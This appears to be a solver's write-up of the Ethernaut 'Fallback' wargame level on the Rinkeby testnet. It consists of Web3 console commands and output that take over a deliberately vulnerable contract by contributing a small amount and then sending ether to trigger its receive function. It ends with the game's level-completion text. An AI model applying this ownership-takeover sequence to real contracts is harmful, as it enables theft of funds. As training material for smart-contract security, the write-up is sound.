
## Web3 console cmd
Contract link
https://rinkeby.etherscan.io/address/0xa74746de333958789c0e57aeb12515a050f438ff

	await contract.address
		'0xA74746dE333958789c0e57Aeb12515a050F438FF'

	await contract.owner()
		'0x9CB391dbcD447E645D6Cb55dE6ca23164130D008'

	contract.abi
	(7) [{…}, {…}, {…}, {…}, {…}, {…}, {…}]
		0: {inputs: Array(0), stateMutability: 'nonpayable', type: 'constructor', constant: undefined, payable: undefined}
		1: {inputs: Array(0), name: 'contribute', outputs: Array(0), stateMutability: 'payable', type: 'function', …}
		2: {inputs: Array(1), name: 'contributions', outputs: Array(1), stateMutability: 'view', type: 'function', …}
		3: {inputs: Array(0), name: 'getContribution', outputs: Array(1), stateMutability: 'view', type: 'function', …}
		4: {inputs: Array(0), name: 'owner', outputs: Array(1), stateMutability: 'view', type: 'function', …}
		5: {inputs: Array(0), name: 'withdraw', outputs: Array(0), stateMutability: 'nonpayable', type: 'function', …}
		6: {stateMutability: 'payable', type: 'receive', constant: undefined, payable: true}

	call fonction contribute
	await sendTransaction({from: "0x6E81372783990a13715857888B32325621DB44E2", to: "0xA74746dE333958789c0e57Aeb12515a050F438FF", value: toWei("0.0001"), data: "0xd7bb99ba"})
		https://rinkeby.etherscan.io/tx/0x665a581bae30d4ec1e8bfb857ebc88b9457669cf3040a2d32d9000db042df2b1

	send eth to triggert callback function receive and become owner of the contract
	await sendTransaction({from: "0x6E81372783990a13715857888B32325621DB44E2", to: "0xA74746dE333958789c0e57Aeb12515a050F438FF", value: toWei("0.0001")})
		https://rinkeby.etherscan.io/tx/0x911f0a3171d06e017d3194b4660eeb850e9d059a8f3e5cffd6fe4b8466b8e8af

	await contract.owner()
		'0x6E81372783990a13715857888B32325621DB44E2'

	await getBalance(contract.address)
		'0.0002'

	
## Fallback
## Level completed!
Difficulty 1/10

You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.

You've also learnt about OpenZeppelin's Ownable contract, and how it can be used to restrict the usage of some methods to a privileged address.

Move on to the next level when you're ready!
